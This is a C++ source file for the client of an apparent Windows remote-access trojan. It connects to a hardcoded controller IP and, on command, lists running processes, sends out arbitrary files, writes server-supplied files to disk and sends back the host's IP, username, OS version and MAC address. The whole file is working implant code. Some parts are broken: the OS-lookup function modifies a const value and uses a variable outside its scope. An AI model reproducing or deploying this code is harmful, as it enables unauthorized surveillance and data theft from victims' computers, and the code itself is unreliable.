#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <windows.h>
#include <Lmcons.h>
#include <psapi.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

std::string getProcessName(DWORD processID);
std::string getIPAddress();

int sendToServer(std::string data, SOCKET sock){
    int sendResult = send(sock, data.c_str(), data.size() + 1, 0);
    if(sendResult == SOCKET_ERROR){
       return 1;
    }

    return 0;
}

void downloadFileFromServer(SOCKET clientSocket, char buf[]){
    int bytesReceived;
    
    ZeroMemory(buf, 9999);
    bytesReceived = recv(clientSocket, buf, 9999, 0);
    std::string fileContents = std::string(buf, 0, bytesReceived);

    ZeroMemory(buf, 9999);
    bytesReceived = recv(clientSocket, buf, 9999, 0);
    std::string fileName = std::string(buf, 0, bytesReceived);

    std::ofstream file(fileName);

    file << fileContents;

    file.close();
}

std::string uploadFileToServer(std::string filePath){
    std::string fileContents;

    std::ifstream file(filePath);
    if(file.fail()){
        std::cout << "[-] File: " << filePath << " does not exist" << std::endl;
        return "";
    }
    else{
        std::string line;
        while(getline(file, line)){
            fileContents += line;
        }

    }

    file.close();

    return fileContents;
}

void getProcesses(SOCKET socket){
    int sendResult;
    DWORD aProcesses[1024], needed, proceses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &needed)) {
        return;
    }

    proceses = needed / sizeof(DWORD);

    for (i = 0; i < proceses; i++) {
        if (aProcesses[i] != 0) {
            std::string processName = getProcessName(aProcesses[i]);
            if(processName != ""){
                std::cout << processName << std::endl;
                sendResult = sendToServer(processName, socket);
                if(sendResult == 1){
                    std::cerr << "[-] Error Sending Process Name" << std::endl;
                    exit(1);
                }
            }
        }
    }

    std::string completeMessage = "DONE";
    std::cout << completeMessage << std::endl;
    sendResult = sendToServer(completeMessage, socket);
    if(sendResult == 1){
        std::cerr << "[-] Error Sending Process Listing Complete Message" << std::endl;
        exit(1);
    }
}

std::string getProcessName(DWORD processID) {
    TCHAR szProcessName[MAX_PATH] = TEXT("");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

    if (NULL != hProcess) {
        HMODULE module;
        DWORD needed;

        if (EnumProcessModules(hProcess, &module, sizeof(module), &needed)) {
            GetModuleBaseName(hProcess, module, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    std::string processName;
    #ifndef UNICODE
        processName = szProcessName;
    #else
        std::wstring wStr = szProcessName;
        processName = std::string(wStr.begin(), wStr.end());
    #endif

    CloseHandle(hProcess);

    return processName;
}



//Function to get the client's Operating System
std::string getOperatingSystem(){
    HKEY key;
    bool res = false;

    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), NULL, KEY_QUERY_VALUE, &key) == ERROR_SUCCESS){

        DWORD keyType = 0;
        DWORD dataSize = 0;
        const DWORD flags = RRF_RT_REG_SZ;
        
        //first call to identify size of buffer of registry value
        LONG result = ::RegGetValue(key, NULL, TEXT("ProductName"), flags, &keyType, nullptr, &dataSize);
        if(result != ERROR_SUCCESS){
            std::cout << "[-] Error Unable to Read Registry" << std::endl;
            exit(1);
        }

        //calculating buffersizes
        std::wstring data;
        data.resize(dataSize / sizeof(wchar_t));

        //actually obtaining the string value now
        result = ::RegGetValue(key, NULL, TEXT("ProductName"), flags, nullptr, &data[0], &dataSize);
        if(result != ERROR_SUCCESS){
            std::cout << "[-] Error Unable to Read Registry" << std::endl;
            exit(1);
        }

        //releasing buffer
        const DWORD actualLength = dataSize / sizeof(wchar_t);
        actualLength -= 1;
        data.resize(actualLength);

    }

    std::string productName;
    #ifndef UNICODE
        productName = data;
    #else
        std::wstring wStr = data;
        productName = std::string(wStr.begin(), wStr.end());
    #endif

    RegCloseKey(key);

    return productName;
    
}

std::string getMacAddress(){
    std::string macAddress = "";

    DWORD dwRetVal;
    IPAddr DestIp = 0;
    IPAddr SrcIp = 0;
    ULONG MacAddr[2];
    ULONG PhysAddrLen = 6;

    BYTE *bPhysAddr;
    unsigned int i;

    DestIp = inet_addr(getIPAddress().c_str());
    SrcIp = inet_addr(getIPAddress().c_str());

    memset(&MacAddr, 0xff, sizeof(MacAddr));

    dwRetVal = SendARP(DestIp, SrcIp, &MacAddr, &PhysAddrLen);

    char * data = (char *) malloc(9999);

    if (dwRetVal == NO_ERROR){
        bPhysAddr = (BYTE *) &MacAddr;
        if(PhysAddrLen){
            for (i = 0; i < (int) PhysAddrLen; i++) {
                if (i == (PhysAddrLen - 1))
                    
                    sprintf(data, "%.2X\n", (int) bPhysAddr[i]);
                    //printf("%.2X\n", (int) bPhysAddr[i]);
                else
                    sprintf(data, "%.2X-", (int) bPhysAddr[i]);
                    //printf("%.2X-", (int) bPhysAddr[i]);
                
                macAddress += std::string(data);
            }
        }
    }else {
        std::cerr << "[-] Error Gathering Mac Address" << std::endl;
        exit(1);
    }

    return macAddress;
}

// Function to get the client's IP address
std::string getIPAddress(){
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostName[255];
    gethostname(hostName, sizeof(hostName));

    struct hostent* host = gethostbyname(hostName);
    if (host == NULL) {
        WSACleanup();
        return "";
    }

    char* ipAddress = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
    WSACleanup();
    return ipAddress;
}

// Function to get the client's username
std::string getUsername(){
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);
    std::string hostname;


    #ifndef UNICODE
        hostname = username;
    #else
        std::wstring temp = username;
        hostname = std::string(temp.begin(), temp.end());
    #endif

    return hostname;
}

int main(){
    std::string ipAddress = "192.168.197.41"; //change this value
    int port = 54000;

    //initalize WinSock
    WSAData data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if(wsResult != 0){
        std::cerr << "[-] Can't start Winsock" << std::endl;
        return 1;
    }

    //create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        std::cerr << "[-] Can't Create socket" << std::endl;
        return 1;
    }

    //fill in a hint structure
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

    //connect to server
    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if(connResult == SOCKET_ERROR){
        std::cerr << "[-] Can't Connect to Server" << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    char buf[9999];
   do {
    ZeroMemory(buf, 9999);
    int bytesReceived = recv(sock, buf, 9999, 0);
    std::cout << "SERVER RESPONSE: " << std::string(buf, 0, bytesReceived) << std::endl;
    //int sendResult = send(sock, std::string(buf, 0, bytesReceived).c_str(), std::string(buf, 0, bytesReceived).size() + 1, 0);

    std::string command = std::string(buf, 0, bytesReceived);

    if(command == "quit"){
        std::cout << "[+] Program is Quitting" << std::endl;
        break;
    }

    else if(command == "listProc"){
        std::cout << "[+] Requesting Process Listing" << std::endl;
        getProcesses(sock);
    }
    
    else if(command == "upload"){
        std::cout << "[+] Upload File Sequence Beginning" << std::endl;
        std::string filePath;
            
        downloadFileFromServer(sock, buf);
    }
    
    else if(command == "download"){
        std::cout << "[+] Download File Sequence Beginning" << std::endl;

        int bytesReceived;
        ZeroMemory(buf, 9999);
        bytesReceived = recv(sock, buf, 9999, 0);
        std::string filePath = std::string(buf, 0, bytesReceived);

        std::string fileContents = uploadFileToServer(filePath);
        int sendResult;

        std::cout << "[+] File Contents Obtained" << std::endl;
        sendResult = sendToServer(fileContents, sock);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending File Content Data" << std::endl;
            return 1;
        }

    }
    
    else if(command == "infoList") {
        std::cout << "[+] Listing Client's Information" << std::endl;
        std::string ipAddress = getIPAddress();
        std::string username = getUsername();
        std::string version = getOperatingSystem();
        std::string macAddress = getMacAddress();

        int sendResult;
        std::cout << ipAddress << std::endl;
        sendResult = sendToServer(ipAddress, sock);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending IP address Data" << std::endl;
            return 1;
        }

        std::cout << username << std::endl;
        sendResult = sendToServer(username, sock);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending Username Data" << std::endl;
            return 1;
        }

        std::cout << version << std::endl;
        sendResult = sendToServer(version, sock);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending Version Data" << std::endl;
            return 1;
        }

        std::cout << macAddress << std::endl;
        sendResult = sendToServer(macAddress, sock);
        if(sendResult == 1){
            std::cerr << "[-] Error Sending Mac address Data" << std::endl;
            return 1;
        }

        std::cout << "[+] Information Listing Complete" << std::endl;
    }

    else{
        continue;
    }

   } while(true);

    closesocket(sock); 

    return 0;
}